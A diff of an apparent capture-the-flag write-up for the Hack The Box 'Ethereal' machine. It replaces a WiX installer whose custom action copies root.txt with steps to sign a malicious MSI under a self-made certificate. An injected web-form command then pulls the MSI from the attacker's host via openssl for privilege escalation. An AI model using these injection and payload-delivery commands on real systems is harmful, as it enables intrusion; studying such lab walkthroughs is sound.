@@ -343,30 +343,45 @@ Please drop MSIs that need testing into this folder - I will review regularly. C
 ```
 
 Next task, create a `msi` file!?
-I used `wix tool` to create the msi.
+I used a tool called EMCO MSI Package Builder.
 
-```xml
-<?xml version="1.0"?>
-<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
-	<Product Id="*" UpgradeCode="ABCDDCBA-7349-453F-94F6-BCB5110BA4FD" Name="Mal msi" Version="0.0.1" Manufacturer="myorg" Language="1033">
-	<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
-	<Media Id="1" Cabinet="malmsi.cab" EmbedCab="yes"/>
-	<Directory Id="TARGETDIR" Name="SourceDir">
-		<Directory Id="ProgramFilesFolder">
-			<Directory Id="INSTALLLOCATION" Name="malmsi">
-				<Component Id="malmsi" Guid="ABCDDCBA-83F1-4F22-985B-FDB3C8ABD471">
-					<File Id="malmsi" Source="malmsi.exe"/>
-				</Component>
-			</Directory>
-		</Directory>
-	</Directory>
-	<Feature Id="DefaultFeature" Level="1">
-		<ComponentRef Id="foobar"/>
-	</Feature>
-	<CustomAction Id="Root" Directory="TARGETDIR" ExeCommand="cmd.exe /c type c:\users\rupal\desktop\root.txt > c:\users\public\desktop\shortcuts\success.txt" Execute="deferred" Impersonate="yes" Return="ignore"/>
-	<InstallExecuteSequence>
-		<Custom Action="Root" After="InstallInitialize"></Custom>
-	</InstallExecuteSequence>
-	</Product>
-</Wix>
+![malmsi]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/ethereal/makemsi.JPG)
+
+```bash
+C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>makecert.exe -pe -n "CN=My SPC" -a sha256 -cy end -sky signature -ic \Users\pswapnil\Desktop\myca.cer -iv \Users\pswapnil\Desktop\myca.pvk -sv \Users\pswapnil\Desktop\MySPC.pvk \Users\pswapnil\Desktop\MySPC.cer
+Succeeded
+
+C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>pvk2pfx.exe -pvk \Users\pswapnil\Desktop\MySPC.pvk -spc \Users\pswapnil\Desktop\MySPC.cer -pfx \Users\pswapnil\Desktop\MySPC.pfx
+
+C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin>signtool.exe sign /v /f \Users\pswapnil\Desktop\MySPC.pfx /tr "http://timestamp.digicert.com" /td sha256 /fd sha256 \Users\pswapnil\Desktop\ethereal\ethereal.msi
+The following certificate was selected:
+    Issued to: My SPC
+    Issued by: My CA
+    Expires:   Sat Dec 31 15:59:59 2039
+    SHA1 hash: 4AE112B8A498C3054308367DD04C80AA921B4BD4
+
+Done Adding Additional Store
+Successfully signed and timestamped: \Users\pswapnil\Desktop\ethereal\ethereal.msi
+
+Number of files successfully Signed: 1
+Number of warnings: 0
+Number of errors: 0
 ```
+
+Let's copy the msi to the system using `openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < ethereal.msi` and run `& c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect <myip>:73 > c:\users\public\desktop\shortcuts\ethereal.msi` on the web form.
+
+```bash
+C:\Users\jorge\Documents>cd c:\users\public\desktop\shortcuts
+C:\Users\Public\Desktop\Shortcuts>copy /y ethereal.msi d:\DEV\MSIs
+```
+
+After copying the msi to the `D:` drive, I got the root.txt a few seconds later.
+
+```bash
+C:\Users\Public\Desktop\Shortcuts>type getmeroot.txt
+1******************************f
+```
+
+Finally! So much to do in this box. A great experience nonetheless.
+
+Happy Hacking! Cheers!
